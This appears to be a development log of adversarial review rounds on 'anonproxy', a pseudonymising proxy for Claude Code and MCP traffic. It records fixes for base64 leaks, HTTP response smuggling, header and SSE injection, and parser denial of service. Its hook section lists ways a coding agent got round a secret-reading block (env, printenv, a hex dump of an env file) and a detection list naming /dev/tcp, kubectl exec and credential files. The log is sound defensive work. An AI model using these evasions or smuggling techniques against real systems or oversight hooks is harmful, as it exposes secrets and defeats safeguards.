bypassing restoration. The test now sweeps all four with one marker, so it also
holds for the fifth site someone adds.

**Interim `1xx` responses were not modelled at all — HIGH, one silent.** A 1xx
announces that the real response follows on the SAME connection. Treated as
final: a client sending `Expect: 100-continue` deadlocked against a proxy
waiting for its body (both refused, 502); an upstream bundling 1xx with the
final response tripped the residue check; and worst, an upstream answering
later had its real response thrown away — the client got the `100 Continue` and
waited forever. A `101` is refused: what follows is no longer HTTP, so relaying
it would be the silent fail-open.

**Small input, disproportionate cost, twice more.** 12 KB of nested JSON blew
the Python stack (`json.loads` is iterative in C, the walk is not) and killed
the connection without a word. And `_lire_entete` swallowed `LimitOverrunError`
and `IncompleteReadError` into `None`, so `_echange` left by a path that is NOT
an exception — around the guard meant to ensure no interruption stays mute. The
client received zero bytes.

**An invalid env setting raised on EVERY request** instead of refusing the
start, so a typo read as a channel failure. The refusal was right; its MOMENT
was wrong.

**Rejected after proof**: span offsets are characters, not bytes. **Fixed from
a round-9 lead**: fragments now join across any horizontal whitespace — a
non-breaking space, which is standard French typography, left `Marguerite
Vasseur` as two people.

## Round 11 (2026-08-12) — the guard I had just written WAS the leak

Four narrow perimeters again, and one of them deliberately aimed at the half
this loop never attacks: **the RETURN**. Eight defects, **six of them written
in the previous two hours**.

**`_semble_du_texte` — CRITICAL, and the shape of it is the lesson.** Round 10
made the DECODE decide whether a base64 payload is text, then added a guard on
top: refuse if it carries a NUL byte or over 5 % control characters, so a short
binary that decodes by luck is not corrupted. The upstream only had to slip in
ONE NUL byte to switch the substitution off — real value out, no vault entry,
nothing to count. The docstring two lines above stated the rule the code broke:
*erring toward binary leaks silently, erring toward text corrupts visibly.*
**A guard whose failure is silent and which the attacker triggers at will is
not a guard.** Removed; the UTF-8 decode is the only judge.

**A separator alone is no more injective than a substitution.** The fingerprint
naming from round 10 joined its fields with `\x1f` — so it depended, silently,
on that byte never appearing in the data. `scope_key` and `session` come
straight from environment variables: `scope_key="\x1f"` and `session="\x1f"`
produced the same file, so a *reveal* crossed. Same class as the day before,
one layer down. Each field is now length-prefixed.

**And that same fix had broken the scope hierarchy.** Putting the session into
EVERY non-global fingerprint fragmented the PROJECT scope by session: a project
rule stopped applying as soon as `ANONPROXY_SESSION` changed — which is every
session, that being its whole point. "Project is the default for session" meant
nothing any more. Caught by a test of mine that had to be turned: two sessions
of one project SHOULD share their project file.

**Two silent key-collision losses, in two channels.** The walker's guard was
asymmetric — it required the current key to have been substituted, so a
substituted key landing on `hostname` followed by the REAL `hostname` overwrote
in silence: the operator read a `tool_use.input` with two arguments where the
model emitted three. And the MCP channel had no such guard at all, in EITHER
direction: on the way back, what the server actually answered never reached the
operator. A dict source has no duplicate keys, so a collision can only come
from the transformation, whichever order it arrives in.

**The interim loop I had just written had no bound**, and the inactivity
deadline cannot catch it: it rearms on every read, so one complete
`100 Continue` every two minutes holds an exchange forever. Bounded at eight.
**And `Expect` was stripped unconditionally** before its value was even read:
an expectation other than `100-continue` vanished, the upstream could no longer
send the 417 the RFC owes the client, and a conforming client waited until the
deadline — 502 on a legitimate request. An intermediary that can neither honour
nor forward an expectation answers 417 itself.

**Also fixed**: an incomplete span raised `KeyError` where the contract
promises a fail-closed `ValueError` — the invariant was written and not held.
And the six date formats that fell through to a WORD (`3 fév.`, `15 Sept`,
`2020/03/15`, `March 3, 2020`, `03/15/2020`) are parsed, with the written form
surviving the shift: a full name stays full, an abbreviation keeps its length,
`1er` comes back only when the shifted date lands on the first. What stays
ambiguous — `3 jui` (June or July), a two-digit year — is NOT guessed.

## Round 12 (2026-08-12) — THREE guards of mine, each one the leak it prevented

Four narrow perimeters on code less than three hours old. Ten defects, and the
shape of the round is one sentence: **every guard I added "out of caution" on
top of a protection decision became the switch that turns the protection off,
and the sender chooses when to flip it.**

- the **shape guard** (round 11): one NUL byte disabled substitution;
- the **field-name list** (`blob`/`data`/`content`): the name is written by the
  upstream — `payload` was enough;
- the **length threshold** (16 chars, mine, two hours old): `10.0.0.1` encodes
  to twelve characters, `srv-42` to eight. Every short IPv4 and hostname passed
  intact, and it was a REGRESSION on fields that were already decoded unbounded.

All three removed. What makes the open sweep safe is the property none of the
guards added: **the round trip is the IDENTITY when nothing is detected**, so
an opaque token comes back byte for byte.

**Response smuggling, through the door I had just opened — CRITICAL.** A `1xx`
never has a body; the one it declared was never drained, so its bytes became
the NEXT header. An upstream slipped a complete `418` inside a `100 Continue`
and the client received it as its answer. `_residu_amont` cannot see it: after
the fake response the buffer is empty. Same class as the trailer and the 204
body, closed at round 6, through a surface that did not exist then.

**A denial of service I reintroduced, measured by myself.** `chercher` took
**56.7 s on 100 KB** of letters with no date — a free class at the head of the
month pattern, scanning from every position. Three rounds were spent on exactly
this family in the hook, and the rule they produced ("every pattern anchored on
its literal") had been reopened two hours earlier by adding one date form.
4.5 ms after anchoring; 48 ms on 1 MB.

**A real date left in the clear.** A value holding TWO dates only shifted the
first — and `resserrer` narrowed the span to it, so the second fell OUTSIDE the
substituted range entirely. A range is the most ordinary form there is. Root
cause found while fixing: `_ISO` accepted `[T ].*` as "a time to preserve" — a
FREE TAIL that swallowed the second date. Same class as the URL paths of
round 11.

**Restoration lost in silence, twice.** `sept` prefixes both `septembre` and
`september`, and table order decided alone: an English document got a French
month (`sept 15, 2020` → `août 2, 2021`). The model normalises what it reads,
and the vault holds only the French form. Same class from truncation: `juillet`
cut to three gives `jui` — the ambiguous prefix the parser REFUSES — and `août`
gave `aoû` where the source was pure ASCII. The invariant that was missing:
**what we write must be re-readable as the same month**, checked rather than
assumed.

**A lone surrogate crashed the whole chain.** `"\ud800"` is valid JSON and is
not valid UTF-8. Fixing the fingerprint moved the crash into the vault, then
into its re-read — three moves. **A value traverses the whole chain or enters
nowhere.**

**Rejected after arbitration**: two keys that canonicalise to the same
surrogate abort the exchange. Both agents proposed counting instead of
refusing; counting still loses the value, and merging changes the schema the
server expects. Loud beats silent, and it is documented.

## Round 13 (2026-08-12) — the proof list itself was the hole

**The control interface had been silently disconnected for two rounds.** Python
moved its policy file naming to a length-prefixed fingerprint (rounds 11-12);
the Go service, which writes the operator's decisions into the SAME directory,
kept the old character substitution. So the operator arbitrated, the interface
reported success, and the engine never saw it — **on the one decision that
cannot be taken back**.

It survived two rounds because **the five proofs I kept replaying never crossed
into Go**. `tests/control_e2e.sh` catches it in one line, and I had not run it
since the change. The routine is now SIX proofs, and both implementations pin
the same naming vectors (`go/internal/policy/naming_test.go`,
`tests/test_parite_nommage.py`) — if either drifts, one goes red.

**Go rendered a real value the vault never held — CRITICAL.** `encoding/json`
replaces every invalid UTF-8 byte with U+FFFD, and Python deliberately lets
non-UTF-8 values through (round 12). So the operator read a string that exists
nowhere — and three DISTINCT hosts collapsed into one identical display, making
"reveal A while meaning B" possible. The question now stays listed with a
`value_error` saying why its value is missing: hiding the question would hide
that a decision is pending, and rendering it falsely is worse than both.
`POST /decide` refuses a target carrying a replacement character for the same
reason.

**Response smuggling, third door at the same place — CRITICAL.** The interim
guard read a DICTIONARY of headers, which keeps the last value:
`content-length: 69` then `content-length: 0` showed every guard a nil framing
while sixty-nine bytes waited in the buffer. The refusal now lives in the
PARSING — an ambiguous framing is unreadable everywhere, not only where it was
seen passing this time.

**Three more base64 leaks, and my own invariant was false.** A payload inside a
LIST was never traversed (`{"blobs": ["…"]}` is the ordinary shape of an MCP
resource batch). MIME-wrapped base64 — what `base64.encodebytes` and `openssl
base64` produce — matched nothing and left verbatim. And the IDENTITY property
the module claims was **false**: `b64decode(validate=True)` validates the
alphabet, not canonicity, so non-zero padding bits decoded and re-encoded
NORMALISED — an opaque token came back changed. The round trip is now required
to reproduce what was read, or the string is not touched.

**Two more in the date parser, both mine from three hours earlier.** The
overlap dedup compared each candidate to ALL kept ones — quadratic: 30 000
dates in 300 KB cost 12.6 s, 100 000 never finished. **My own regression test
measured text WITHOUT dates** — where the PREVIOUS defect lived. I tested where
the last one was, not where the new one could be born. Now 0.22 s on 100 000.
And truncating a month to the source's length produced forms nobody writes
(`nove.`, `déce.`, and `Marc 3, 2020` read as March): proving the PARSER can
re-read what it writes does not prove a human would write it. Only standard
abbreviations are produced now, and only they are accepted.

**Still open, stated**: a base64 payload encoded TWICE hides its content from
one decode pass; the sweep calls the detector about twice more than needed per
base64 string; a signed state token whose payload is UTF-8 JSON is modified,
so its signature stops validating — the accepted price of the open sweep, and
it fails visibly.

## Round 14 (2026-08-12) — the guard, the twin, and the proof that never ran

Four narrow perimeters. Seven defects, and for the first time the round found
something in the layer ABOVE the code: a proof of mine that returned green
without executing.

**A single padding bit switched the substitution off — CRITICAL, silent.**
Round 13 added a canonicity check so an opaque token would come back byte for
byte; `…bA==` and `…bB==` decode to the SAME value, every real-world decoder
being permissive on padding bits, so changing one character was enough for the
payload to stop being seen and the real value to leave with no trace. **Fourth
occurrence of the same pattern in the same file**, and the identity it claimed
to protect was already held elsewhere: `_chaine` returns the ORIGINAL string
when nothing is substituted. A guard that duplicates a property it does not
provide is only a switch.

**A real date left in the clear at the edge of the range — CRITICAL.**
`9999-12-31` — the "no end date" of contracts, subscriptions and entitlements —
overflowed on `date + timedelta`, and the fragment was copied VERBATIM while
the other date of the interval shifted normally: the surrogate was returned,
therefore judged good, carrying the real value. The shift now ROTATES within
the representable range: still a date (the nature invariant), still a bijection
(D6), and the overflow class disappears rather than being caught.

**The generic fallback carried the real year.** It copies the first digit run
for plausibility (`srv-42` → `glacier-vault42`) — an INDEX for a hostname, the
CONTENT for a date: `expire le 9999-12-31` rendered `atlas-glacier9999`. Found
while checking the fix above, because routing a date to that fallback would
have moved the leak instead of closing it. The reviewing agent had seen the
symptom and filed it as another module's business.

**Go and Python named the same file differently, again — CRITICAL.** The
readable prefix truncates and trims in one order on one side and the opposite
on the other; `sub → [:40] → strip` and `sub → trim → [:40]` do not commute.
Measured: **8 divergences over 20 scope keys**, including the wholly ordinary
`projet.avec.des.points…` — no leading separator needed, just a dot landing at
the fortieth character. Same fingerprint, different file, so a revoked reveal
went on revealing. It is the round-13 defect one layer up: the fingerprint had
been fixed on both sides, the prefix beside it had not.

**And the corpus that closes it found a SECOND divergence, in the deciding
part**: the length prefix counts CHARACTERS in Python and BYTES in Go, so
`projet-café` frames as 11 on one side and 12 on the other. A project path with
an accent was enough. Python now counts the bytes of the form it actually
hashes, `surrogateescape` being the exact inverse of how `os.environ` was read
— so what Python frames is what the OS gave and what Go holds.

**The proof itself was the hole — and this one is the lesson of the round.**
Pinning vectors on both sides had not stopped the divergence, because all five
carried a benign key: they DEFENDED what they checked without COVERING the
class. So the corpus became one shared file — and `go test` returned
`ok (cached)` on a deliberately corrupted corpus, because **the cache does not
track a file read outside the module**. A green obtained without executing, on
the very proof meant to detect the divergence. The corpus now lives in the Go
package, both sides read it, and a Python test requires it to contain a WITNESS
of the trap (a key for which truncating and trimming do not commute) — a
property rather than an enumeration, so a corpus rewritten with benign keys
goes red.

**Proxy — a control character that is not a terminator.** Header injection
needs `\r` or `\n`, which is what the check refused; but a NUL cuts a string
for a client written in C without cutting anything for us:
`content-length\x00x: 999` travelled verbatim and that client read TWO framings,
its truncated one and ours. The class is "our reading differs from the
recipient's", which is the root of the three response thefts already closed
here. All C0 controls and DEL are refused now, HTAB excepted (the RFC allows it
in a value, and refusing it would break legitimate responses). Closed at the
same time, its TWIN: I had refused the SAME framing header twice and left
`content-length` AND `transfer-encoding` together — the classic desync
primitive, harmless only as long as the upstream connection serves one exchange.

**Method — an agent's severity is a hypothesis, not a finding.** The proxy
agent died mid-stream announcing a CRITICAL on those control characters;
resumed, it RETRACTED it itself ("I showed survival, not that a client reads an
extra header") and named the one case it had not tested — which turned out to
be the real one. Two of the four agents produced their best material after
being asked what they had NOT proven.

## Round 15 (2026-08-12) — a contract NARROWER than the receiver's

Ten defects, and nine of them are one sentence: **the protection rested on a
reading of base64 narrower than the one the receiver performs.** Four
successive formulations of that same mistake had been shipped, each closing the
previous and leaving the next.

**Measured, not assumed** — the same trapped payload through three receivers:
`Buffer.from` of Node (the ordinary MCP implementation) and Python applied to
the wire bytes both return `db-01.acme.internal` intact; Go's strict decoder
refuses and STILL hands back the already-decoded prefix to whoever ignores its
error. Three ways to hide it, all silent:
- **an invisible character** (zero-width space, BOM, soft hyphen, word joiner)
  — only whitespace was stripped, and `'​'.isspace()` is False;
- **a visible one** — `.`, `,`, `"` are discarded by both decoders too, so a
  contract based on "odd characters" would have left an ordinary one open;
- **anything after the padding** — the whole string had to be canonical, while
  a receiver decodes the PREFIX and drops the rest.

And a fourth where the two receivers DIVERGE: a stray `=` mid-stream. Python
reads straight through it, Node stops at it and reads a partial value. One
reading is not enough, so both are produced and the string is substituted as
soon as either carries something.

**Two regressions of my own fix, within the hour.** Widening what counts as a
payload made `_charge_encodee` claim fields it had no business claiming — the
MCP tool name, which is a routing key, came out substituted. That function
turned out to be pure duplication since every string leaf goes through
`_chaine`; it was removed rather than patched. And a reading that DECODES but
finds nothing was short-circuiting the text: `10.1.2.3` reduces to four
characters that decode, so the address would have left in the clear. **A
reading that carries nothing must never prevent the text from being protected.**

**The literal year was the twin of the rotation.** Round 14 made the shift
rotate near `9999-12-31`; the numeric renderers write the year on four digits,
the literal ones wrote it bare, so `December 31, 9999` rendered
`October 16, 2` — a form nobody writes and that this module's own parser
REFUSES. The fix had been carried to one half of the rendering.

**And the digit exclusion was a BLACKLIST**, therefore wrong by construction.
Excluding only `DATE` left every other type without a branch of its own:
`jdoe1985` kept a birth year, a CPF its first three digits, a namespace its
project year. The condition is inverted — the digit run is copied only where an
infrastructure prefix makes it an INDEX (`svc-42`).

### The proof-integrity perimeter paid for itself
A fourth agent was given a perimeter that is not code: **which proofs go green
without executing?** It verified that every round-14 regression test does redden
when its fix is reverted (6/6, 4/4, 3/3 — the confirmation the routine was
missing), and it found the hole: round 14 closed TWO divergences in one gesture
and pinned a witness for only ONE. A single corpus vector distinguishes bytes
from characters, and nothing required its presence — "tidying the unicode out of
the corpus", precisely the gesture that had let the first divergence through,
would have reopened the second in silence. It also found a complacent case of
mine: `Q3 2024` asserted the year was gone while the fallback had copied `3`.

**Stated residual, pinned by a test that asserts the leak**: a JWT is base64URL
without padding, its three parts are not read one by one, so a real value in its
payload leaves in the clear — and whether the token is traversed depends on how
its lengths align, which is not a defensible invariant either. The test will go
red the day the parts are read, which is the intended signal.

## Round 16 (2026-08-12) — the enumeration was the defect, three times over

Five defects, and each one is the same shape: **a rule written as a LIST of the
cases known at the time, where the property was available instead.**

**Base64 without padding, CRITICAL and the sixth of its family.** `_BASE64`
requires a trailing `=`, so the prefix reading stops one quantum early and
yields `db-01.acme.interna` — nothing to substitute — while the broad reading
only fired on a stray `=`, which an unpadded string does not have. Python
refuses incomplete padding, but `Buffer.from` of Node, which IS the ordinary MCP
implementation, completes it and reads the whole value. The trigger is now
NON-COVERAGE, not the enumeration of the reasons that produce it — that
enumeration had been too narrow three rounds running.

**My whitelist of the hour before leaked exactly like the blacklist it
replaced.** Requiring an infrastructure prefix and then copying the first digit
run ANYWHERE is the same positional mistake turned around: `svc-1985-jdoe`,
`ns-19850201-jdoe` and `team-2024-billing` all carry a prefix AND numeric
content. What decides is neither the type nor the prefix but WHERE the number
sits — glued to the prefix, and short. And my own regression test had covered
only the trivial half: values that carry no prefix at all, so the whitelist
branch was never exercised.

**A month with no abbreviation still got the abbreviation's dot** — third
occurrence of the round-12 pattern. `mars`, `mai`, `juin`, `août` and `may` have
no short form: their standard form IS the full name, so `3 oct. 2020` rendered
`2 mars. 2022`. The parser re-reads it, which is exactly what kept it invisible,
but nobody writes it: the model normalises to `2 mars 2022` and the vault holds
only the aberration. Same round: `1er` is the canonical French first-of-month,
and a source that did not itself fall on a first had nothing to say about it —
`15 mars 2020` shifted onto a first rendered `1 août 2022` where the model
writes `1er`.

**The proof perimeter found the missing witness again**, in the round it was
created for: round 15's commit named THREE forms closed by one fix, and the
tests pinned two. Restoring `fullmatch` left 216 tests green while four printable
characters glued after the padding leaked the value. It also confirmed the other
three fixes are covered — 4, 4 and 20+ tests redden when their fix is reverted.
**Two rounds, two missing witnesses, both on the same shape**: a fix that closes
several forms needs a witness per form, not per fix.

## Round 17 (2026-08-12) — a position nobody tested, and the proof perimeter comes back clean

**A base64 payload in a KEY went out verbatim — CRITICAL, silent, and the code
contradicted its own docstring.** `_libre` states "a key is a value like any
other"; that was true of the TEXT but not of what it ENCODES, since keys only
ever received the transformer, never the payload reader. A MCP server that
indexes its resources as `{"<base64>": {…}}` — the ordinary shape of a
dictionary keyed by identifier — therefore sent the real value out at any
depth, in both directions, with nothing in the clear for the egress harness or
the corpus to count. Seventh occurrence of the same family, and the reason
sixteen rounds missed it is worth keeping: **every payload test puts the payload
in a VALUE.** A position that is not tested is a position that is not protected.

**The ordinal followed the field ORDER instead of the LANGUAGE.** The day-month
pattern also recognises English months — `3 May 2020` is the international form
— so deciding `1er` on the parser that matched produced `1er November 2021`, a
French marker in front of an English month, which the model drops when it copies.
Exactly the correction round 13 made for `sept`, which belongs to both
languages, left unported to the ordinal marker: **the language is read off the
resolved TABLE, never off the pattern that matched.**

**The proof perimeter returns its first CLEAN report**, after finding something
in each of its three previous rounds. Every round-16 fix has a witness that
reddens when the fix is reverted — verified fix by fix on a copy. It reported
two redundant parametrized cases and one gap (`juin` missing from the five
months with no abbreviation), which is closed. That a perimeter goes quiet is
information, not silence: it is the stopping criterion applying to one surface.

## Round 18 (2026-08-12) — the exemption covered three surfaces for one, and a metric that measured nothing

**The routing exemption reached what the SERVER writes — HIGH, both ways.**
`name` routes a tool call, and that is true under `params`, which the CLIENT
writes. Under `result` and `error` it is the server writing, and `name` there is
data: outgoing it left verbatim, incoming it was not restored, so the operator
read the surrogate with nothing to tell them. A non-scalar value carried its
whole subtree with it. The rule applied is the one the walker took eight rounds
to formulate — **a protocol key is guarded by its POSITION or by the SHAPE of
its value, never copied unconditionally** — and it had never been carried to
this channel. No test saw it because `test_the_tool_name_stays_verbatim` covers
`params.name` and nothing else: the same forgotten position as the payload-in-a-
key of the round before, in the same file.

**A lone Unicode surrogate killed the exchange, in BOTH directions.** `"\ud800"`
is valid JSON and is not valid UTF-8: `json.loads` accepts it, re-encoding
refuses it, and the exchange died on an unnamed exception — reachable by any MCP
server on purpose, and produced by accident by a UTF-16 export or mis-encoded
CJK. The vault had settled the same question at round 12 (*a value traverses the
whole chain or enters nowhere*) and the channel had not inherited it. Re-escaping
renders the form the SENDER itself used, so valid UTF-8 losing nothing, where
`surrogatepass` would put WTF-8 on the wire. **And it had a twin one leg
further**, in the reverse proxy, where `JSONResponse` raises on the same input —
so the decision now lives in ONE place (`anonproxy/serialisation.py`) called by
both paths, because three implantations of one rule is the definition of the
trap this project has paid most often.

**A metric that could not fire.** `corpus_eval.py` reported "invalid JSON: 0" as
a hard criterion while checking `json.loads(json.dumps({"text": out}))`, which
succeeds for every Python string — the counter was mathematically incapable of
incrementing. It now checks what it claims: a document that WAS valid JSON must
still be after substitution. Low severity (the criterion gates nothing), but it
is the same shape as the missing witness — a claim with nothing behind it.

**Method — a witness must cover both DIRECTIONS too.** The proof perimeter
verified the round-17 fixes redden per function and per form, and noted that the
key test exercised only the outgoing path: a regression of the return path would
not have reddened. Extended.

## Round 19 (2026-08-12) — the third implantation, and a vacuity that moved

Three defects, and the round is the clearest illustration of the trap this
project pays most: **the same rule written in three places, and only two of them
were fixed.**

**The SSE stream was the third implantation — HIGH.** Round 18 routed the
non-streamed body and the MCP channel through one serialiser, and its own commit
message said that three implantations of a rule are the definition of the twin
defect. `sse.py` was the third, and it kept `json.dumps(...).encode("utf-8")`.
A lone surrogate there does not cost one event: the encoder raises, the proxy
emits an `error` event, and **every subsequent event is dropped, `message_stop`
included — so the client waits forever.** Worse than the case that motivated the
fix, in the file next to it.

**The envelope was copied without looking at its value — HIGH, both ways.**
Round 18 had just hardened the neighbouring routing key on (position AND scalar
shape); `jsonrpc`, `id` and `method` kept being copied unconditionally. An `id`
carrying an object or a list travelled verbatim outgoing and was not restored
incoming, and it is the SENDER who chooses. JSON-RPC gives each of the three a
shape; that shape is now the guard. No test saw it because
`test_the_envelope_stays_verbatim` only ever puts a SCALAR in `id`.

**A vacuity that moved rather than closed.** Round 18 fixed a tautological
metric — "invalid JSON" counted with `json.loads(json.dumps({"text": out}))`,
which succeeds for every Python string. The replacement asks whether a document
that WAS JSON still is; but no entry of the synthetic corpus is JSON, so the
premise is empty and the criterion still cannot redden. **Fixing a vacuous
conclusion with a vacuous premise is not fixing it**: the denominator is printed
now, so a criterion that measures nothing says so.

**Method — an interrupted agent is worth resuming.** The machine rebooted with
three agents in flight. All three returned their reading from their transcript
alone, without re-running anything, and two of the three findings above come
from that recovery. Confirms round 9's lesson, this time on a hard interruption
rather than a stream timeout.

**Checked and rejected**: a bodied 204/304 through the restored-response path —
the branch requires `content-type: application/json` and an empty body makes
`upstream.json()` raise, so it fails closed on a 502, before as after the change.

## Round 20 (2026-08-12) — models alternated, and the twin was one line up

First round with the agent models ALTERNATED (opus and fable, jo's call). Two
agents found the same defect by different routes — one attacking the code, the
other attacking the proofs — which is what the alternation was for.

**The twin of the round-19 fix was in the SAME function, one line above.**
Round 19 routed the `data:` payload through the safe encoder and left the
`event:` name on `str.encode`: a type carrying a lone surrogate raised there,
with the identical consequence — the whole stream lost, `message_stop` never
delivered, client waiting forever. **And my own witness lied**: it exercised only
the dict shape of `type`, whose representation is pure ASCII, so it survives
trivially. Routing the name through the same encoder also closes an SSE
injection the fable agent measured: a `\n\n` in the type produced a block
separator on the wire, so the client read TWO blocks where one was sent.

**A block that fails to parse goes out VERBATIM**, so its surrogates are never
restored and the operator reads a fictional name with nothing to tell them.
`parse_sse_block` split lines with `str.splitlines`, which also splits on
U+2028, U+2029, U+0085 and the file separators — which the BLOCK separator does
not recognise. `json.dumps` does not escape them outside ASCII mode, so an
ordinary text carrying one was enough. Line splitting now follows the SSE spec
and nothing else.

**At message level the KEY was copied verbatim** — fourth position the tests
ignored, in the same file. A key that is neither envelope nor data had its value
transformed and its name copied as is, so an extra key added by a server for its
telemetry left in the clear and was not restored on the way back. The module
docstring already said a key is protocol by its POSITION, never by its name.

**Walker — `dependencies` is a UNION, and only one of its forms was modelled.**
In JSON Schema draft-04/06/07 the value is either a list of property names (a
contract, so verbatim is right, like `required`) or a full SUB-SCHEMA. The
walker classed it structural in both cases, so descriptions, defaults and enums
inside the schema form left in the clear — and the walker never even saw the
text, so there was no vault entry and nothing to count. The split into
`dependentRequired`/`dependentSchemas` dates from 2019-09: everything generated
from OpenAPI 3.0, which is draft-04 based, emits the leaking form. Fixed under
rule 2 — the test was shown to jo first, and it reddens on the schema form while
staying green on the list form.

## Round 21 (2026-08-12) — the fifth position, and a witness that only tested the survivor

**A string can carry SEVERAL payloads, and only the first was read — CRITICAL.**
What FOLLOWED a base64 payload was merely text-substituted, never re-read as a
string, so the first payload was protected and every one after it left encoded.
The standard decoders stop at the first padding, which is what kept it invisible
— but the real value CROSSES the boundary all the same, and a server that wants
it takes it in two lines. Nothing in the clear, so nothing to count. **Fifth
position the tests ignored**, after the value, the list, the key and the message
level, and the only one that lives INSIDE a string. Same defect in the non-JSON
body fallback, which applied the transformer alone.

Fixing it made the sweep quadratic — 8 000 concatenated payloads held the proxy
for eight seconds — so the number of payloads read from one string is bounded and
the excess is REFUSED, loudly. Measured before deciding: the receivers' own
decoders were interrogated rather than reasoned about, and that is what
distinguished the real leak (concatenated payloads) from the false one (letters
glued in front, which shift the alignment so that nobody, including the
receiver, reads the value).

**`None` said two different things.** `parse_sse_block` returned it both for
"nothing to do" (keep-alive, `[DONE]`) and for "there is data and I cannot read
it" — and the caller forwarded the block VERBATIM under a comment announcing a
ping. Its surrogates are then never restored. Relaying stays the right call, but
the second case now raises, is counted (`sse_illisible`) and is logged: a residual
is counted, never silent.

**Walker — the twin of `dependencies`, one keyword family away.** `default`,
`const`, `example` and `examples` carry a literal VALUE, not a sub-schema, yet
`in_schema` was propagated into them: the structural keywords they contain —
`type`, `format`, `required`, `$anchor`, `dependentRequired` — were rendered
verbatim. Twenty measured leaks, all silent. The `enum` branch a few lines above
already traversed its members in DATA mode for exactly this reason. `default`
objects are everywhere in a schema generated from an OpenAPI: Kubernetes CRDs,
Terraform providers.

**And the proof perimeter caught my own witness lying, for the second round
running.** `test_un_type_ne_peut_pas_couper_le_bloc_en_deux` counted `\n\n`
occurrences; two of its three parametrized cases passed WITHOUT the fix while
looking like they covered it, and one of those two — a `data:` line injected
into the event name — makes the block unparseable, so it goes out verbatim. The
assertion now checks the ROUND TRIP and the absence of a raw line ending in the
name line, which witnesses all four forms at once: six tests redden without the
fix, against three before.

## Round 22 (2026-08-12) — a contract announced is a contract held

Five defects, every one of them in code written in the previous hour, and three
of the five are the same sentence said three ways: **a shape that was announced
and not verified.**

**A short payload at the head blocked the whole sweep — CRITICAL.** `aGk=`,
base64 for "hi", carries only THREE characters before its padding where the
pattern requires four, so the match fails at the origin, the reading list comes
back empty, and everything that followed was abandoned to text — the real
value's payload included. What kept it invisible is that a receiver reading the
whole string only gets "hi"; a receiver reading token by token gets the value.
**Sixth position the tests ignored**, and the first that sits UPSTREAM of the
loop rather than inside it. The sweep now advances to the next candidate.

**`parse_sse_block` announced `dict | None` and returned whatever it parsed.**
`true`, `42`, `[1,2,3]`, `"a string"` are perfectly valid JSON; the rewriter then
raised `AttributeError`, the exception was caught at the LOOP level, and the
stream stopped there — every later event lost, `message_stop` included, so the
client waits forever. A contract that is announced is held.

**`None` still said two things**, one round after being split. "Nothing to do"
and "data lodged somewhere other than `data:`" — a surrogate in an `id:` field
went out verbatim, unrestored. Closed at the CLASS rather than counted: whatever
is relayed without being understood is still RESTORED as text, which assumes no
structure at all.

**And the `dependencies` union had a third form.** The round-20 fix modelled
"list of names" against "sub-schema" and trusted `isinstance(pdef, list)` without
looking inside: a dict smuggled into the list carried its values straight
through, unseen. The fix that claimed to model the union missed one of its
branches.

**The proof perimeter caught a third witness of mine**, and this one is the
plainest: a test named `est_COMPTE` asserted only that the parser raises, never
that the caller counts. `state.sse_illisible` was **unobservable by the whole
suite** — removing the increment left 2925 tests green. The rule it yields:
**when a test names a property in its title, the property belongs in the
assertion, not in the docstring**, and two distinct surfaces (raising, counting)
need two witnesses.

## Defects fixed in `anthropic_walker.py` (rule 6 — tests supplied FIRST)

`tests/test_walker_defects.py` proves all four, with minimal fixes (the fourth
came out of the adversarial review):
0. **Fail-open on surfaces** — only `system`/`messages`/`tools`/`metadata` were
   traversed; `stop_sequences`, `mcp_servers`, `container`, `tool_choice`
   leaked, and the real capture already shows
   `context_management`/`output_config`/`thinking` at the top level. Fix:
   traverse EVERYTHING except `REQUEST_CONTROL_KEYS`.
1. **Crash** `TypeError: unhashable type: 'dict'` — `node.get("type")` tested
   against a frozenset while a schema property can be called "type". Seen in a
   real session → 500, Claude Code stops. Fix: an `isinstance(str)` guard.
2. **Leak** — the `properties` branch was dead ("properties" appeared in
   `SCHEMA_STRUCTURAL_KEYS`, tested first): the description of a property named
   `name`/`id`/`data` was NOT substituted (SKIP_KEYS applied to property
   names). Fix: handle `properties` first.
3. **Corruption** — `$schema`, `$ref`, `required` were substituted → API 400
   "JSON schema is invalid", and `required` no longer matched the property
   names. Fix: those keys are copied verbatim; new `SCHEMA_NESTED_KEYS` for
   `additionalProperties`/`items`.

## First adversarial review (2026-08-02, 3 opus agents at max effort)

Findings proven and fixed, with regression tests in
`tests/test_review_regressions.py` and `test_pretooluse_hook.py`:

**Proxy leaks** — passthrough forwarded the raw body on any unmodelled path
(`/v1/messages/batches`, `/v1/complete`) → 501 fail-closed · `walk_request`
enumerated only 4 surfaces while the API has others (`stop_sequences`,
`mcp_servers`, `container`, `tool_choice`) → traversal inverted (everything
except `REQUEST_CONTROL_KEYS`) · `MIN_LEN=7` let `db01`, `jdoe` and every short
identifier through → removed · `regex` mode on large volumes disabled the NER →
overlapping chunking instead · URL path left in clear
(`registry.X/payments/api` → host masked, path bare) → segments and query
values substituted.

**Engine** — a shared attribute could substitute to ITSELF (zone
`lamna.internal`, prefix `172.22.96.0` in clear): the `candidate == real` guard
was missing in `_alloc_shared` · invalid spans (inverted, out of bounds)
duplicated the real value → strict validation, fail-closed · one host seen as
HOSTNAME/FQDN/CERT_CN or in different cases received up to 4 fictional
identities → canonical vault key · partial overlap left the end of a domain in
clear → uncovered fragments are preserved · image tag preserved (SHA, branch,
customer name) → substituted unless a public version · internal type
`_SUBNET_V4` forgeable → refused.

**Hook** — detection was POSITIONAL: `/usr/bin/env`, `command env`,
`bash -c env`, `printenv VAR`, `an[o]nproxy` and reading an environment file
piped to a hex dumper all passed. Replaced by normalisation (quoting, globs,
backslashes) plus tokenisation. Added: `/dev/tcp`, embedded network
(python/node/perl), `k`/`oc`, `kubectl exec|cp`, `helm get values`, tfstate,
cloud tokens, outbound WebFetch, unenumerated tools (MultiEdit, LS, Task, MCP),
non-string payloads.

**Complacent tests** — the collision counter was tautological (it iterated the
keys of a dict, unique by construction) → raw lines plus an active injectivity
probe · the leak search missed `\uXXXX` and `%XX` (hence every accent) →
normalisation before searching · the sensitive-value dictionary completed and
derived from the fixture · assertions weakened by fallback `or`s removed.

## Follow-up to the review (2026-08-02, second pass)

- `walk_response` only restored `content` → the whole body now, plus the SSE
  `message_delta` / `error` events (echo of `stop_sequence`).
- Pipeline cache **keyed by scope** (otherwise a Pseudonymizer reused across
  two scopes served the first one's surrogate).
- Query params relayed on `/v1/messages` and `count_tokens` (`?beta=true`).
- Plausibility (D1): UUID version and variant preserved, Cisco MAC notation
  preserved, `sha256:` prefix kept, `PERSON` keeps its word count, IPv6 literal
  in a URL handled, IPv6 host space raised to 64 bits.
